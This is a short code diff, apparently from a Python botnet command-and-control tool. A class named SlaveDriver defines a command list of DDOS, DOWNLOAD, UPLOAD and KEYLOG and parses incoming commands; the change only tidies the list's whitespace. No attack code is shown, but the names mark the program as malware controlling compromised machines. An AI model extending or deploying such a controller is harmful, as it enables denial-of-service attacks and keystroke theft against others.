@@ -81,7 +81,7 @@ class SlaveDriver(basic.LineReceiver):
         self.transport.write('>>> ')
 
     def handlecmd(self, line):
-    	commands = ['DDOS','DOWNLOAD', 'UPLOAD' ,'KEYLOG']
+    	commands = ['DDOS','DOWNLOAD','UPLOAD','KEYLOG']
     	#parse out actual command
     	tmp = line.split(' ')
     	cmd = tmp[0].upper()
